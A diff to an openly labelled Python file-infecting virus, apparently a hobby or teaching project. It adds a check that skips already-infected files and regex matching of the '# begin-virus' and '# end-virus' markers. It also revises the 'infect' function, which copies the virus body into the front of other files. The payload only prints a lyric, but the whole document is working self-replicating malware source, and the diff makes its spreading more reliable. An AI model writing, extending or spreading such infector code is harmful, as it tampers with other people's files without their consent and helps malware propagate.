@@ -8,6 +8,7 @@
 # Functions/methods part of the virus code
 
 import glob
+import re
 
 def get_content_of_file(file):
     data = None
@@ -15,6 +16,14 @@ def get_content_of_file(file):
         data = my_file.readlines()
 
     return data
+
+def get_content_if_infectable(file):
+    data = get_content_of_file(file)
+    for line in data:
+        if "# begin-virus" in line:
+            # print ("DEBUG: file already infected: ", file)
+            return None
+    return data    
 
 def get_virus_code():
     # Read the content of this or any infected file. 
@@ -27,14 +36,17 @@ def get_virus_code():
                                                                                    
     for line in code:                                                              
         #print ("DEBUG: code line found: ",line)
-        if "# begin-virus\r\n" in line:                                              
+
+        regexp = re.compile(r'# begin-virus[\r\n]')
+        if regexp.search(line):        
             virus_code_on = True                                                   
                                                                                    
         if virus_code_on:                                                          
-            #print ("DEBUG: virus code line found: ",line)
+            # print ("DEBUG: virus code line found: ",line)
             virus_code.append(line)                                                
                                                                                    
-        if "# end-virus\r\n" in line:                                                
+        regexp = re.compile(r'# end-virus[\r\n]')
+        if regexp.search(line):                
             virus_code_on = False                                                  
             break                                                                  
                                                                                    
@@ -51,12 +63,12 @@ def summon_chaos():
      # the virus payload
     print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")
 
-def infect(file, virus_code):    
-    data=get_content_of_file(file)
-    with open(file, "w") as infected_file:
-        print ("Infecting file: ", file)
-        infected_file.write("".join(virus_code))
-        infected_file.writelines(data)        
+def infect(file, virus_code):        
+    if (data:=get_content_if_infectable(file)):
+        with open(file, "w") as infected_file:
+            # print ("DEBUG: Infecting file: ", file)
+            infected_file.write("".join(virus_code))
+            infected_file.writelines(data)        
 
 # --------------------------------------------------------------
 # Here starts the execution of the virus
